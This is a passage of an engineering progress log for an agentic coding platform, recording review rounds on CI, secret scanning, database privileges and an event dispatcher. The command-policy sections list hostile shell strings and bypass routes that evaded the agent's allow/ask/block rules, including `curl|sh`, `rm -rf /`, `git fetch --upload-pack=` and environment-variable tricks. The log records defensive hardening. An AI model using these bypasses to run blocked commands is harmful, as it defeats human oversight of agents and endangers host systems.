- **Hooks call local binaries directly**, not `pnpm exec` — `pnpm exec` triggers an implicit install
  check on every hook run.
- **CI is a single `ci.yml`** with jobs lint · typecheck · unit+contract · ui · integration · e2e ·
  secret-scan · commitlint · dco, as WP-00 asks. Splitting into the separate workflow files listed in
  technical/11 (`integration.yml`, `secrets-scan.yml`, `dco.yml`, `image.yml`, …) is left to the WPs
  that need them. DCO is a plain `git rev-list` + trailer check, so no third-party action to pin.
- **`pnpm dev` and `pnpm schemas` are stubs** that print what they are waiting for and exit 0
  (WP-06/WP-20 and WP-01 respectively).

Evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0, each with a
  single final `PASS: <target>` line; the FAIL path was proven with a deliberate type error.
- Pre-commit hook proven to block: a planted `glpat-…` fake token staged in a throwaway repo using
  this repo's `lefthook.yml` and `.gitleaks.toml` → `leaks found: 2`, hook exit 1. Artefacts deleted;
  `grep` confirms no planted value anywhere in the tree.
- `gitleaks dir .` and `gitleaks git --log-opts=--all` (5 commits) — no leaks.
- `actionlint` (Docker) on `.github/workflows/ci.yml` — 0 errors.

### WP-00 — reviewer round 1 (REQUEST_CHANGES, 2026-09-09)

Blocking:
1. `README.md`, `CONTRIBUTING.md`, `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md` document `pnpm -s verify`, which pnpm 12.3.4 rejects (`unexpected argument '-s' found`). Must be `pnpm run -s <target>` — the protocol doc was already corrected by the orchestrator.
2. `scripts/gitleaks.mjs` exits 0 when neither a binary nor Docker is available, and that is the only step of the CI `secret-scan` job → a scan that cannot run reports success. Fail-open contradicts BD-002; must fail closed in CI.
3. `CLAUDE.md` claims `.js` extensions keep sources runnable under Node type stripping — false on Node 25 (stripping needs the on-disk `.ts` specifier). Keep the convention, fix the stated reason.

Non-blocking (recorded, fixed opportunistically): `NO_UPDATE_NOTIFIER=1` for `@b12k/gitleaks` (its `update-notifier` chain reads `~/.npmrc` tokens); Docker fallback tag-pinned not digest-pinned and uses the legacy `zricethezav/gitleaks` image instead of `ghcr.io/gitleaks/gitleaks`; `.gitleaks.toml` allowlists `pnpm-lock.yaml` wholesale and exempts any line containing "example"; no import-boundary lint yet (add at WP-01/02 when the first cross-package import lands); `.env.example` omits `APP_FEATURE_*` from technical/12.

### WP-00 — round 2 (implementer response to review round 1)

All three blocking findings and non-blocking 4–7 fixed; the import-boundary lint is deferred as
agreed (no cross-package import exists yet).

1. **Invocation form.** `pnpm run -s <target>` everywhere in `README.md`, `CONTRIBUTING.md`,
   `CLAUDE.md`, `.github/PULL_REQUEST_TEMPLATE.md`; also normalised `pnpm -s run X` → `pnpm run -s X`
   in `.github/workflows/ci.yml` and the `scripts/verify.mjs` header. Tree grep is clean apart from
   `PROGRESS.md`, the protocol doc (both describe the broken form deliberately) and
   **`.claude/agents/{implementer,reviewer}.md`, which still say `pnpm -s verify` on three lines**.
   Those are subagent definitions — harness configuration — so the implementer did not edit them;
   the orchestrator should. Until then every implementer and reviewer is told to run a command that
   errors out.
2. **Secret scan fails closed.** `scripts/gitleaks.mjs` now exits non-zero whenever the scan could
   not run and `--require` was passed or `CI` is set. The pre-commit job and the new
   `secrets:scan:ci` script (used by `ci.yml`) both pass `--require`. `GITLEAKS_SKIP=1` is the only
   way past it locally, it prints a loud banner, and CI ignores it. Manual `pnpm secrets:scan`
   keeps the friendly warn-and-exit-0 behaviour.
3. **`.js` extension rationale corrected** in `CLAUDE.md` and above: it is what a future `tsc` ESM
   emit will require, nothing enforces it under `moduleResolution: bundler`, and it does *not* make
   sources runnable under Node's type stripping.
4. `NO_UPDATE_NOTIFIER: '1'` in every child environment the script spawns (including the probes).
5. Docker fallback is `ghcr.io/gitleaks/gitleaks@sha256:c00b6bd0…bbb7f` (v8.30.1 multi-arch index
   digest), run with `--network=none` and a read-only mount. (Round 2 briefly dropped
   `--network=none` on the false premise that it blocks the pull — the daemon pulls over the host
   network; the flag only affects the container namespace. Restored in round 3.)
6. `.gitleaks.toml`: the blanket `[allowlist] paths` block is **gone entirely** — both scans pass
   without it. The fixture rule's exemption is now the single regex `FAKE`, the marker BD-002
   actually prescribes.
7. `.env.example` gained `APP_FEATURE_TICKET_LINTER|REVIEW_ONLY|MAINTENANCE|SHADOW_MODE|DIGEST`.

Round-2 evidence:
- `pnpm run -s verify` · `verify:integration` · `verify:e2e` · `verify:ui` — all exit 0.
- Fail-closed proof, binary and Docker both unreachable (`PATH=/usr/bin:/bin`, script copied to a
  directory with no `node_modules`): `CI=1` → exit 1; `--require` → exit 1;
  `CI=1 GITLEAKS_SKIP=1 --require` → exit 1 (opt-out ignored in CI);
  `GITLEAKS_SKIP=1 --require` → exit 0 with the banner; no flags → exit 0 with the warning.
- Docker fallback exercised on the pinned digest: planted `glpat-…` → `leaks found: 2`, exit 1;
  clean tree → exit 0.
- Pre-commit re-proven with the final `--require` config: planted secret → exit 1, clean → exit 0.
- `pnpm secrets:scan` and `secrets:scan:ci` (full history) — no leaks. `actionlint` — 0 errors.

### WP-01 — `packages/contracts` (APPROVE, round 1)

Reviewer confirmed doc fidelity: all 49 events in technical/02's catalogue present with exact names and
no inventions; technical/12's config example transcribed key-for-key and parsing; all nine artifact
`data` shapes field-for-field; technical/08 and /04 sampled and matching. `z.strictObject` everywhere —
no `z.object(`, `catchall`, `passthrough`, `any` or `unknown` in the package; every `z.record` is one of
technical/12's user-keyed maps or an opaque provider payload.

**Docs amended by the orchestrator to match the implementation** (the code was right, the docs were
loose): technical/02 line 62 — `actor` lives in the event envelope, not in each payload (matches
`events.actor` in technical/03); technical/12 — `features.shadow_mode` added to the `features:` block.

**Event field renames to remember** (WP-01 chose these over the catalogue's one-line prose):
`ticket.matched.type` → `issue_type`; `task.stage.returned.from`/`to` → `from_stage`/`to_stage`;
`shadow.report.created.comparison` → `artifact`.

**Deferred to later WPs** (reviewer non-blocking, recorded so they are not lost):
- `schemas.ts` mutates `z.globalRegistry` at import and the barrel re-exports it, so every consumer
  inherits ~60 reserved ids; zod 4.5.4's `registry.add` silently overwrites on a duplicate id, and
  `packages/contracts/package.json` declares no `sideEffects`, so the SPA bundles it. Revisit at
  **WP-06** when OpenAPI component naming lands: prefer an exported `registerSchemaIds()`.
- API DTOs are partial — none yet for org stats/audit, project stats, bindings, discovery, kb
  bootstrap/health, task events, shadow reports, or `Idempotency-Key`. The WPs that own those endpoints
  add them.
- `.agentic/pipeline.yml` gate stages accept neither `on` nor `command` — matches the doc's
  `rebase_gate` example but is under-constrained; tighten at **WP-15** (pipeline interpreter).
- `TranscriptEvent` keeps `tool_use_id`/`tool_name` inside content blocks while technical/03 indexes
  them as columns — mapping work for **WP-07**.

Q35 filed in `docs/OPEN-QUESTIONS.md` (technical/12 omits `DiscoveryDraft`'s `data`); recommendation
grounded in product/06 step 2 and implemented.

**Round 2 (hardening, APPROVE).** Five reviewer non-blockers folded in before commit: the `$defs`
collision guard now keys on the canonical definition (the old guard could never fire, so two different
anon defs could merge silently) and moved to an internal `json-schema-defs.ts`; the type-stripping
resolver is scoped to the repo root and outside `node_modules`; the boundary lint denies unknown
packages by default and closes the relative-escape holes; `verify` emits exactly one stdout line per
target (child stdout → fd 2), restoring the protocol's contract; coverage reached 100/100/100/100 over
285 tests. The implementer also found and fixed a real dangling-`$ref` bug that produced
`#/$defs/#/$defs/__schemaN`. `schemas/` regenerates byte-identically.

Residual, all verified unreachable today — fix if the area is touched again:
- an `anon_<hash>` name colliding with a real named `$defs` entry silently clobbers it (one
  `if (!ANONYMOUS_DEF.test(name) && defs[name])` restores the old guard's coverage);
- `stabiliseDefs` rewrites `#/$defs/__schemaN` anywhere in the serialised document, including inside
  `description`/`const`/`enum` strings;
- the Biome `@platform/*` group misses **subpath** specifiers (`@platform/application/src/x.js` passes
  lint; only the `.`-only `exports` maps stop it) and relative escapes to a package root outside `src/`
  (`../../contracts/index.js`);
- any future `verify` step whose stdout must be *captured* will silently land on stderr.

### WP-02 / WP-03 — review round 1 findings (both REQUEST_CHANGES, 2026-09-09)

Both reviewers reproduced their findings by exploit rather than by reading, which is the standard to hold.

**WP-03 (Postgres) — two proven privilege escalations.** (a) Both SECURITY DEFINER functions were created
with PostgreSQL's default `EXECUTE TO PUBLIC`; the `REVOKE ... FROM PUBLIC` lived only inside
`platform_apply_grants`, which never runs when `APP_DB_APP_ROLE=''` — the pgbouncer configuration
`.env.example` itself documents. A role holding only `CONNECT` dropped a `run_messages` partition.
(b) `event_streams` was not registered in `platform_table_policy`, so `platform_app` held UPDATE/DELETE on
the table that substitutes for technical/03's `UNIQUE(stream_type,stream_id,stream_seq)` — deleting a row
and re-inserting produced two events at seq 1, i.e. WP-04 would have inherited a forgeable invariant.
Also fixed this round: partition bounds cast in the caller's TimeZone (a non-UTC session aborts
`platform_ensure_partitions` with "partition would overlap"); `platform_drop_expired_partitions` taking an
unfloored retention window from the caller as a designed bypass of `REVOKE DELETE`; a missing concurrency
test for the seq guard; and `migrator.ts` (240 lines, including the branch that opened finding (a))
excluded from coverage.

**WP-02 (domain) — three command-policy bypasses**, all returning `allow`: `&` missing from the list
operators (`ls & sudo reboot`); backticks not treated as substitution (``ls `rm -rf /` ``); and
prefix-anchored block globs that a moved flag escapes (`git push origin agentic/x --force`), which also
left product/19 §3's "writing outside the workspace" with no pattern at all
(`cat /etc/passwd > /root/.ssh/authorized_keys`). Separately, `resolvedBinary` never blocked anything
because block patterns are command-line globs, so BD-025's "resolved against the real binary" was unmet —
and the test that covered it passed a whole command line as the binary. The block-list property test also
filtered out exactly the metacharacters that break segmentation.

**Docs amended by the orchestrator** (code was right, or the doc had a real gap): technical/02 gains
`run.created` (the `created→starting` transition was silent, contradicting the document's own rule that
every state change is an event); technical/03 gains the `feedback` table (technical/02 and
`contracts/records.ts` both define the aggregate, the data model had no table), a corrected
`runs_active_idx` status list (`queued` is not in the `run_status` enum), and a note that `stage` on
`RunRecord`/`QuestionRecord` must be **nullable** because not every run or question belongs to a pipeline
stage (`task_stage_id` is nullable) — WP-01 typed it non-nullable; WP-04 corrects the contract.

**Scheduled follow-ups (not done in these WPs):** `pipelineLimitsSchema` lacks two of BD-008's six loops
(`refinement_question_rounds`, `architecture_revisions`) — enforced in domain, not configurable; WIP limits
have no schema anywhere. Both belong in `packages/contracts` + technical/12.

**WP-04 must honour (confirmed by exploit at WP-03 round 2):** the `events_enforce_stream_seq()` trigger
is SECURITY DEFINER and its `on conflict do update … returning` takes the `event_streams` row lock itself,
so per-stream appends serialise without the caller doing anything. WP-04 must **not** issue
`SELECT … FOR UPDATE` on `event_streams` — the app role holds SELECT only, and row locks need UPDATE, so
every lock mode returns 42501. A pessimistic aggregate load locks the aggregate's own read_write row
(e.g. `tasks`). The exposed contract is: insert with `stream_seq = last + 1`; a mismatch raises 23505 and
rolls the counter back with the transaction. Also: no past-month partitions are ever created, so WP-04
must not accept caller-supplied past `occurred_at`.

### WP-02 — command policy: three review rounds on one file

`packages/domain/src/policies/command-policy.ts` took three review rounds; everything else in WP-02 was
approved in round 1. Round 1 found three bypasses (`&` missing from list operators, backticks not scanned,
prefix-anchored block globs a moved flag escapes). Round 2's 101 adversarial probes found three more
(process substitution `<(…)`, ANSI-C quoting `$'…'` desyncing the quote state, and a *regression* — the
new token matcher had silently lost the whole-line glob coverage the old scheme had, so `curl * | sh`
stopped matching).

**The lesson, recorded because it generalises:** a hand-rolled shell scanner will never be complete, so
round 3's instruction was to make parse uncertainty **fail closed** rather than to patch three more cases.
`CommandEvaluation.uncertainty` now names what the scanner could not follow, and a non-empty uncertainty
can never evaluate to `allow` — it floors to the fallback and never loosens a `block`. Exactly five
constructs floor to ask: unclosed quote, unterminated command/process substitution, unterminated backtick,
ANSI-C quoting, arithmetic expansion. Nesting is deliberately *not* one of them, because substitution
bodies and wrapped scripts are parsed recursively to the bottom.

Also landed: argv[0] normalisation (basename, leading `VAR=value`, and the wrapper set
`env/command/exec/nohup/time/nice/ionice/xargs/builtin/sh/bash/zsh/dash/eval`), which closed a whole class
of `FOO=1 sudo reboot` / `xargs sudo id` / `/usr/bin/sudo reboot` misses at once; and `DECLINED_BLOCK_VARIANTS`
naming `rm -fr /`, `rm -r -f /`, `git branch --delete --force main` as deliberately unpatterned, with **Q37**
recommending product/19 §3 state the hazard rather than one spelling.

**Orchestrator correction:** I told the implementer to move all of `git rebase*` to ask; that was too broad
and they pushed back correctly. Only `git rebase* -x*` / `--exec*` are hazardous, and WP-26's rebase gate
runs `git rebase` on its happy path — blanket-asking would cost a human approval on every task. Narrowed to
match how `find * -exec*` was already handled.

**Severity frame for anyone reading this later:** this is a *policy* layer. WP-12's `canUseTool` hook and
TD-021's container isolation are the enforcement points. A command that wrongly reads `ask` is a nuisance;
one that wrongly reads `allow` is the defect.

### WP-02a — command policy, two `allow` routes (carried out of WP-02)

**Why this is a separate WP.** WP-02's three review rounds were spent, and the protocol bounds review loops
at three. But round 3 found two *newly discovered* defects rather than repeated failures to fix the same
thing, and blocking WP-02 would have stalled WP-04 and WP-15 — most of M1 — over one file. So WP-02 is
committed and the two defects are tracked here with a fresh review budget.

**Why committing them is safe today, and when it stops being safe.** This is a *policy* layer. The
enforcement points are WP-12's `canUseTool` hook and TD-021's container isolation, neither of which exists
yet: nothing in the repo can execute a shell command at all. The exploits require the runner and workspace
that WP-12/WP-14 build. **WP-02a must therefore land before WP-12**, and certainly before WP-15 wires the
pipeline. It is not optional cleanup.

**Defect 1 — command-runner flags on allow-listed verbs.** `git fetch --upload-pack='<any command>' .`
executes the payload; verified against real git 2.50.1 in a throwaway repo. Every block-list entry runs
under `allow` this way: sudo, docker, kubectl, `rm -rf /`, `terraform apply`, `npm publish`, `curl | sh`.
`rg --pre` and `rg --hostname-bin` are the same class, as are `git fetch --exec`. This is exactly the hazard
that already moved `find * -exec*` and `git rebase* -x*` to ask — the pattern set simply missed these verbs.
Fix: add ask entries at `DEFAULT_IMPLEMENTATION_ASK`.

**Defect 2 — assignment peeling grants `allow` to an unread line.** `stripEnvironmentPrefix` peels leading
`VAR=value` before the allow/ask lists match, so `PATH=/w/bin ls -la` evaluates as plain `ls` and returns
allow — verified executing a fake `ls`. `LD_PRELOAD=…`, `GIT_SSH_COMMAND=… git fetch`,
`GIT_EXTERNAL_DIFF=… git diff` and `GIT_PAGER=… git log` are the same route, and it defeats BD-025's
"resolved against the real binary" in the process. This is the precise reasoning the implementer used for
*not* peeling `sh -c`/`eval`/`xargs` — it was applied to the wrapper half of the peel but not the
assignment half. Fix: keep the peel for the block list only (where it can only tighten), or floor any
assignment-bearing line at ask.

**Also in scope for WP-02a (non-blocking at WP-02):**
- `close + 2` off-by-one at `command-policy.ts:554-555` swallows the character after `$((…))`, so
  `ls $((1))&sudo id` never splits on `&` — ask instead of block. A real desync the uncertainty floor
  cannot catch, because it is not a parse *failure*.
- `git push -f`, `git push origin agentic/x --delete` and refspec form `agentic/foo:main` are not blocked
  though `--force`, `--force-with-lease` and `origin :*` are — spelling gaps, not logic gaps.
- `curl|sh` whitespace sensitivity: `curl http://x|sh`, `| bash`, `| /bin/sh`, `|&` and `wget -O- http://x|sh`
  all reach ask rather than block.
- `git commit --no-verify` is allowed and bypasses this repo's own gitleaks/lefthook pre-commit.
- `evaluateCommand(…, fallback:'allow')` would disarm the uncertainty floor entirely; no caller does that
  today, but nothing prevents one.
- **Q37 must be widened** and its "never allow" claim dropped — it is now demonstrably false.

**What the final review did confirm:** process substitution, ANSI-C quoting, the restored whole-line glob,
the wrapper asymmetry (`env ls` allow, `env nice sudo id` block), the six `git rebase` verdicts, and the
uncertainty floor itself — no path reaches `allow` with non-empty uncertainty. 188 hand-written adversarial
inputs plus 23,760 fuzzed combinations found **no segmentation hole**: every fuzzed `allow` was correct
shell semantics. No ReDoS (50KB input → 8ms). The defects above are missing *patterns* and one peel that
grants trust, not a broken parser.

### WP-05 — the `debounce` that was not a debounce

The review found that the `Jobs` port's `debounce` mode runs its leading job **immediately** (`startAfter`
is now) and its trailing job at the next grid boundary, which can be milliseconds later. technical/02:106
requires the pipeline to debounce `mr.review.comment` for 2 minutes per MR **and then emit one**
`task.stage.returned`; as first shipped, a burst would emit up to two stage-returns with the first instant —
the task would bounce back to Implementation before the human finished commenting. **WP-15's MR batcher must
not use a fixed-grid coalescing primitive for this.** The pattern it needs is a delayed wake-up plus
re-validation on wake: schedule a timer 2 minutes out, and when it fires, re-read whether more comments have
arrived and reschedule if so. TD-004's own "timers re-validate" line is the same idea.

Second finding worth generalising: **the in-memory fake was kinder than pg-boss.** It bucketed the
coalescing slot by `startAfter`, while pg-boss buckets by the database's `now()` (`plans.js:1748`) and
overwrites the caller's `startAfter` with the next slot boundary on a debounce retry. The reviewer found
this by reading pg-boss's source, not the docs. A shared contract suite only protects later WPs if the fake
is *at least as strict* as the real adapter — every WP from here trusts the fake in the unit tier.

**Flake economics, quantified.** The coalescing acceptance test races a 2-second grid boundary across three
awaited round-trips: ~0.2% failure locally, **5-30% on a loaded 2-core runner**. Combined with the WP-02
property-test timeout, the rule for this repo is now explicit: *an assertion that depends on wall-clock
speed is a hardware assertion, not a correctness one.* Use the virtual clock in the contract tier, keep
real-time assertions to "never early", and give anything that must sleep real headroom.

**For WP-06:** `registerPartitionMaintenance` is exported and integration-proven but no `apps/*` composition
root calls it — the daily partition cron WP-03 built will not run until WP-06 wires it. Also note
`defineQueue` is create-if-absent, so changing a queue's policy in code is a silent no-op against a queue
that already exists; a boot-time drift check would catch it.

### WP-02a — what a hand-rolled command policy actually costs

Recorded because the pattern repeated four times and the next person will be tempted to write one of these.

Across WP-02 rounds 1-3 and WP-02a rounds 1-2, six independent adversarial passes found **fifteen** routes
to `allow` in one file. Each pass found defects the previous pass's fixes had not anticipated, and two
passes found that a *fix itself* had silently removed coverage (`curl * | sh` after the token-matcher
rewrite) or reopened an earlier fix (quote-stripping reopened `find . "-exec"`). The parser was never the
problem — 60,000+ fuzzed inputs found no segmentation hole and no ReDoS. The problems were always
**pattern coverage** and **unearned trust**:

- flags that hand an allow-listed verb an arbitrary command (`git fetch --upload-pack=`,
  `git difftool --extcmd=`, `rg --pre`, `git log --ext-diff`), an arbitrary binary, an arbitrary output
  path (`git diff --output=`, GNU `find -fprint`), or an unread remote source (`pip --index-url`);
- prefix globs matching a *different binary* (`ls*` → `lsof`, `git diff*` → `git difftool`,
  `git fetch*` → `git fetch-pack`);
- peeling something off the front of a line and then trusting what remains (`PATH=… ls`);
- quoting and escaping defeating a matcher that never strips quotes.

**The two things that actually worked**, and that any successor to this code should keep: the fail-closed
uncertainty rule (a line the scanner cannot follow can never read `allow`), and *differential* testing —
running the old and new revision side by side over a large corpus and asserting that no verdict loosened.
That second technique caught a regression no amount of new test cases would have: the implementer's own
fuzz found that their `|&` fix had made `|& docker run alpine` a one-stage pipeline which a `length > 1`
guard then dropped, loosening 185 verdicts.

**But differential testing is only as good as the axes you vary, and this is the sharper lesson.** The
implementer reported "0 loosened" across 4,921 hand-built inputs and 240,000 fuzzed ones. The reviewer's
own 179,712-input sweep found **3,624 loosenings** — a family the implementer's generator could not reach
because its quoting axis never varied the *wrapper token*: `"env" ls -la` and `e\nv ls` now peel for the
allow-list because `stripEnvironmentPrefix` tests the dequoted `argv0Name`. Every one of the 3,624 returns
exactly its unquoted twin's verdict, which was already `allow`, so it is an equivalence family and not a
hole. The finding that matters is procedural: **a differential result is evidence about the corpus, not
about the program**, and the person who built the corpus is the worst judge of what it omits. Two
independent corpora disagreed by 3,624 cases here.

**Two corrections that outlived the round** (both from the round-2 reviewer, both recorded in the module doc):

- The `git commit -m "add --output-file"` over-ask is **not** the shell's doing, as the code comment claimed.
  Bash hands git one word, `add --output-file`, and git never sees a flag. It is `tokenise` splitting on
  whitespace with no quote awareness, after which `unquoteToken` strips the orphan quote and what remains
  classifies as a flag. **The right fix is to make `tokenise` quote-aware** — confirmed to remove the false
  positive without weakening any bypass case. Deliberately not done in WP-02a: it is a behaviour change on
  the security path, and the measured false-positive rate is 0.006% (3 of 54,177 real commit subjects).
  **Do it in the next WP that touches this file.**
- Recorded, no action: `git show-ref`, `git diff-tree`, `git diff-index --quiet HEAD` and `git diff-files`
  moved allow→ask as a side effect of scoping the git verbs — read-only and harmless; add explicit allow
  entries if agents start hitting them. `MAX_WRAPPER_DEPTH = 8` means nine or more stacked `nice -n 5`
  wrappers escape token block-matching and land on `ask` rather than `allow` — pre-existing and fail-safe.
- Property-test timeouts now cover `packages/contracts` too (6 `fc.assert` calls that had none — the same
  5s CI flake surface the ci-fix was written for, in the package the ci-fix had not audited). `contracts` is
  the innermost ring and the dependency rule gives it no workspace import, so its `testing/property.ts` is a
  deliberate copy, not an import.

**Empirical note on over-asking:** measured against 54,177 real commit subjects, the aggressive hazard floor
made only 3 of them non-allow (0.006%). Over-asking is cheap; the instinct to soften a security floor for
false positives was not supported by the data.

### WP-04 — implementation notes for whoever touches the dispatcher next

**One transaction per (event, handler), not per event.** TD-005 records `attempts` and `error` per
*handler*, which only means something if a failing handler can be retried without re-running the ones that
succeeded. Each handler's effect, its `handler_executions` row and anything it emitted commit together or
not at all — that is what turns at-least-once delivery into exactly-once effects. The dispatcher's own
transaction holds the queue row for the length of the dispatch and either deletes it or defers it.

**Migration 0010 exists for two reasons.** `events.id`/`cause_event_id`: technical/02 requires both and WP-01
implemented them, so without the columns a stored event could not be parsed against its own catalogue
schema. `event_dispatch`: an AFTER INSERT trigger on `events` keeps the enqueue inside the appending
transaction — nothing can append without queueing — and makes the sweep O(pending). Anti-joining `events`
against `handler_executions` on every poll would re-read the whole audit log, and no watermark over
`events.position` is safe, because positions are handed out at insert time and commit out of order
(research/07). The queue holds no audit value; what ran stays in `handler_executions`.

**Ordering per stream is enforced twice**: the sweep's `row_number()` returns only the earliest queued event
of each stream, and `hasEarlierPending` re-checks under the claim, so an event handed to `dispatch()` out of
order is refused rather than run. **`stop()` is durable**: the stopping handler writes `stopped` rows for the
remaining handlers in its own transaction with `on conflict do update` (not `do nothing`) — on a redelivery
the policy handler is skipped as already succeeded, so only those rows keep the silenced handlers from
running, and a row left `failed` by an earlier attempt must be overwritten.

**The property tests are only as adversarial as their knobs.** They generate crash schedules on both sides of
each commit, interleaved workers, a `chaoticWorkers` knob that hands the dispatcher events out of order, and
a `selfGuarding` flag that turns the handlers' own idempotency off so `handler_executions` is the only thing
left. Each guard was mutation-checked — disabling the ordering check, the handler claim or `markStopped`
each makes a property fail. Anything added here should be mutation-checked the same way.

### WP-04 / WP-05 reconciliation — one queue of record, decided

Both WPs arrived with a loop. The decision, taken on the WP-04 reviewer's analysis and implemented in both:

**`event_dispatch` plus the sweep is the single queue of record** — that half was right and stands.

**The other half was wrong, and the architect corrected it (2026-09-09).** I said WP-05's `Jobs` port should
drive the sweep. It cannot: `Jobs` offers only `scheduleCron` with a 1-minute floor, while the sweep needs
~1s, and no adapter was ever written. More importantly it *should* not. **The outbox sweep is a local timer
in each process.** Each replica LISTENs on its own connection, so a missed NOTIFY is a *local* loss — a
cluster-singleton job cannot be the fallback for a subscription it does not share. `OutboxWorker` owns its
timer unconditionally; `DrainScheduler`, `OutboxWorkerOptions.scheduler`, the `withTimer` branch and
`EventingOptions.scheduler` are all deleted (tracked as **WP-04a**). `drain()` stays public for tests and
`ROLE=worker --once`.

**N replicas polling one `event_dispatch` every second is correct, not wasteful.** The claim uses
`FOR UPDATE SKIP LOCKED`, so concurrent sweeps never block; a loser reads fewer rows or reports `deferred`,
and per-stream order is still enforced twice (the `row_number()` head plus `hasEarlierPending`). It is below
pg-boss's own per-replica polling (2s default per `work()` subscription), and `drain()` exits when a batch
dispatches nothing, so a replica losing every claim does not spin. The pg-boss route would have been
*worse*: a 1-minute cron floor plus cron-monitor lag (≤45s) plus a 2s worker poll is a far poorer fallback
than the 1s poll TD-014 names, and it writes a durable job row per sweep for durability `event_dispatch`
already owns.

Two costs recorded, not fixed: `readPendingDispatch` windows over the whole queue table, so a deep backlog
costs O(pending) per replica per second; and N fixed 1s timers synchronise, so ±10% jitter is cheap
insurance. Neither matters at current scale.

**Why not make `dispatch(event)` a pg-boss job**, which was the tempting alternative: it duplicates
durability across two queues that disagree after a crash, and pg-boss has no per-stream serialisation — so
ordering would collapse onto `hasEarlierPending` refusing and rescheduling, i.e. a retry storm instead of
deliberate head-of-line blocking.

### WP-04 — the constraint nobody had named

The dispatcher opened a **nested** transaction per handler while the outer dispatch transaction was open,
each taking its own `pool.connect()`. With no `connectionTimeoutMillis`, exhaustion was not an error but a
**permanent silent hang**: N concurrent dispatches with `poolMax <= N` never completed, `APP_DB_POOL_MAX=1`
passed validation and hung on the very first event, and the existing integration test had been hand-tuned to
`max: 8` for 4 dispatchers — exactly 2× — without anyone writing down why.

The fix is worth copying: an implicit constraint became an **enforced invariant**. `EventBus` takes
`maxConcurrentDispatches` (`APP_DISPATCH_MAX_CONCURRENCY`, default 1) with a FIFO slot semaphore;
`requiredConnections = 2 × concurrency + 1`; `createEventing` throws `InsufficientPoolError` naming both
variables and the arithmetic; `APP_DB_CONNECTION_TIMEOUT_MS` (default 10s, floor 100ms) makes exhaustion
fail loudly, leaving the event queued for the sweep. A test pins the failure mode as a prompt error rather
than a hang.

**`MemoryEventing` models no pool** — the one place the fake is kinder than Postgres. A green property run
says nothing about pool sizing. Later WPs must not read it as such.

**Watch at WP-15:** `2 × concurrency + 1` is the right budget only while a handler opens at most one
transaction. A handler that opens a second one silently invalidates it. It is also a **floor for the
dispatcher, not a budget for the process** — the same pool serves `Broadcast.publish`, the API and
whatever WP-05/WP-06 add — so `InsufficientPoolError` and `.env.example` say "above", not "set to".

**Round 2 found the invariant leaking twice, and both are worth remembering.**
- *The semaphore over-admitted.* Releasing a slot decremented the counter and *then* woke a waiter,
  which resumes a microtask later — so for that gap the counter was below the limit and a
  `dispatch()` call already queued took the freed slot while the waiter took one too. Limit 1,
  two handlers. Fix: hand the slot **over** — shift the waiter first and call it without
  decrementing, and drop the increment after the await. There is then no instant at which the slot
  is free. Reproducing it needed the probe to arrive *at* the release rather than before it (a fan
  of dispatches at every microtask depth after each release); the first probe missed it because all
  its callers were already parked in the wait queue.
- *There were still two drain loops.* With a `DrainScheduler` the worker's `#runWoken` still armed
  the poll timer, so the scheduler's recurring drain was a second one — exactly what the
  reconciliation existed to prevent — and the test only passed because its poll interval was longer
  than the assertion window. Fix: `#waitForWork({ withTimer })`, false in the scheduler branch. The
  test now uses a 5 ms interval, so the timer coming back would fail it.

Both are the same lesson: a guarantee that is only *usually* true reads exactly like one that holds,
and a test whose timing hides the difference certifies it. Each guard here is mutation-checked —
revert it and a test must go red.

**The semaphore probe must stay at the unit tier**, and the module comment says so. The reviewer's
equivalent experiment against a real PostgreSQL, pool at exactly the floor, **passes on the broken
semaphore and the fixed one alike**: a COMMIT round-trip pushes the release into a later macrotask
turn, so every caller is already parked and the gap never opens. The in-memory fake, where a commit
resolves on a microtask, is the only instrument that reaches it. Anyone "promoting" that probe to an
integration test deletes the only coverage `requiredConnections` has.

**Two known limits, recorded rather than fixed:** `PostgresBroadcast.close()` does not await an
in-flight `#connect`, so shutdown is deterministic only if the caller awaited `subscribe` first (the
connection cannot leak — that guard is in — but the ordering is not pinned); and a handler that
captures the bus and calls the public `dispatch()` self-deadlocks at concurrency 1, because only
*chained* events inherit their parent's slot. The second belongs in the handler documentation at
WP-06.

### WP-04 — two rounds of "the fix undermined its own invariant"

Both rounds of WP-04 review found the same *shape* of defect: a guarantee stated in a comment, an env file
and an error message, which the code did not actually provide.

**Round 1** was the nested-transaction pool exhaustion (a permanent silent hang; see the note above).
**Round 2** found the fix for it was itself unsound in two ways:

- **The slot semaphore over-admits.** `#releaseSlot` decremented `#active` and *then* woke a waiter that
  incremented it again on a later microtask, so a `dispatch()` already sitting in the microtask queue could
  steal the freed slot. Measured: `maxConcurrentDispatches=1` ran **2 concurrent handlers**. That makes
  `requiredConnections = 2 × concurrency + 1` not an upper bound (C+1 dispatches can need 2C+2) while
  `.env.example` and `InsufficientPoolError` both told the operator to size at exactly 2C+1. Narrow in
  practice — 46 real-Postgres probes never hit it, because the COMMIT round-trip pushes the release into a
  fresh macrotask turn — and self-healing through timeout→requeue, but it falsified the invariant the whole
  fix rested on. The fix is to *hand the slot over* rather than return it to the pool of free slots.
- **There were still two drain loops**, the precise thing the WP-04/WP-05 reconciliation existed to prevent.
  `#runWoken` still armed `setTimeout(pollIntervalMs)` even with a `DrainScheduler` supplied, so the worker
  kept polling *and* the scheduler added a second recurring drain. Proved with a scheduler that never runs
  and no broadcast: the event was dispatched anyway. Both the module comment and the test comment claimed
  the timer had been handed over. The test passed only because `pollIntervalMs` was 1234ms — longer than
  its own assertion window.

**The generalisable lesson, and it is the third time this session:** a comment, an error message or an
`.env.example` line asserting an invariant is not evidence the invariant holds, and a test that would pass
whether or not the behaviour is present is not a test of it. Both defects were found by *constructing the
adversarial interleaving* and by *removing the collaborator* (a scheduler that never runs), not by reading.

**The instrument matters as much as the test (WP-04 round 3).** The reviewer ran the semaphore
over-admission experiment against a *real* Postgres with the pool at exactly the floor, and it passed on the
fixed code **and on the deliberately reverted code alike** — with real I/O every caller is already parked by
the time the release lands, so the race never fires. Only the in-memory microtask probe, fanning dispatches
at depths 0-25, pins the defect. Whoever later finds that probe artificial and "promotes" it to an
integration test will silently delete the only coverage of this bug. The probe's comment now says so.

**Recorded, structural:** the pool guard lives only in `createEventing`, so a hand-built `EventBus` — as in
`broadcast.integration.test.ts` — is unchecked. `Broadcast.publish` also draws from the same pool and sits
outside the `2C+1` accounting; unused by WP-04 today, but WP-05 and WP-06 share that pool, so the required
count is a **floor to add to**, never a target.

### WP-05 — a literal NUL byte turned a source file binary

